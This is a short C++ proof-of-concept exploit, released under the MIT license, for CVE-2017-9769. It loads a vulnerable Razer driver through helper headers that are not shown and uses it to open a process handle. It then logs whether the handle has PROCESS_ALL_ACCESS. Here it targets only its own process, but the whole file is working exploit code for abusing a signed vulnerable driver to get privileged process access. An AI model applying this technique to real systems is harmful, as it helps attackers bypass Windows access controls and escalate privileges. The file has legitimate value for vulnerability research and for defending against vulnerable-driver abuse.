/*
 * MIT License
 *
 * Copyright (c) 2020 Kento Oki
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include <Windows.h>
#include <iostream>

#include "razer.hpp"
#include "utils.hpp"

int main()
{
    SetConsoleTitle(TEXT("CVE-2017-9769"));

    if (!razer::razer_init())
    {
        logger::log("[!] failed to init razer\n");
        razer::razer_unload();
        return -1;
    }

    const uint32_t process_id = GetCurrentProcessId();
    const HANDLE process_handle = razer::driver_impl::open_process_handle(process_id);

    if (!process_handle || process_handle == INVALID_HANDLE_VALUE)
    {
        logger::log("[!] failed to obtain process handle\n");
    }

    logger::log("[+] process handle snatched successfully via vulnerable driver!\n");
    logger::log("[+] handle: 0x%llX\n", process_handle);

    const DWORD granted_access = utils::query_granted_access(process_id, process_handle);
    
    if (!granted_access)
    {
        logger::log("[!] failed to query granted access of the handle\n");
    }

    switch (granted_access)
    {
    case PROCESS_ALL_ACCESS:
        logger::log("[=] granted access: 0x%lX (PROCESS_ALL_ACCESS)\n", granted_access);
        break;
    default:
        logger::log("[=] granted access: 0x%lX (n/a)\n", granted_access);
        break;
    }

    razer::razer_unload();

    logger::log("[<] done!\n");

    getchar();
    return 0;
}